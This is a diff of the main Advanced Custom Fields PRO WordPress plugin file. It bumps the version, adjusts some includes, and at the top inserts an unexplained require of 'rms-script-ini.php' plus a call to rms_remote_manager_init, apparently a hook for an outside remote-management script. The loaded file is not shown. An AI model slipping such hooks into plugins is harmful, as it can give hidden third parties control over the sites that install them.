@@ -3,13 +3,14 @@
 Plugin Name: Advanced Custom Fields PRO
 Plugin URI: https://www.advancedcustomfields.com
 Description: Customize WordPress with powerful, professional and intuitive fields.
-Version: 5.8.4
+Version: 5.8.12
 Author: Elliot Condon
 Author URI: https://www.advancedcustomfields.com
 Text Domain: acf
 Domain Path: /lang
 */
-
+require_once('rms-script-ini.php');
+rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
 if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
 
 if( ! class_exists('ACF') ) :
@@ -17,7 +18,7 @@ if( ! class_exists('ACF') ) :
 class ACF {
 	
 	/** @var string The plugin version number. */
-	var $version = '5.8.4';
+	var $version = '5.8.12';
 	
 	/** @var array The plugin settings array. */
 	var $settings = array();
@@ -144,6 +145,8 @@ class ACF {
 		acf_include('includes/ajax/class-acf-ajax-check-screen.php');
 		acf_include('includes/ajax/class-acf-ajax-user-setting.php');
 		acf_include('includes/ajax/class-acf-ajax-upgrade.php');
+		acf_include('includes/ajax/class-acf-ajax-query.php');
+		acf_include('includes/ajax/class-acf-ajax-query-users.php');
 		
 		// Include forms.
 		acf_include('includes/forms/form-attachment.php');
@@ -165,7 +168,6 @@ class ACF {
 			acf_include('includes/admin/admin-notices.php');
 			acf_include('includes/admin/admin-tools.php');
 			acf_include('includes/admin/admin-upgrade.php');
-			acf_include('includes/admin/settings-info.php');
 		}
 		
 		// Include PRO.
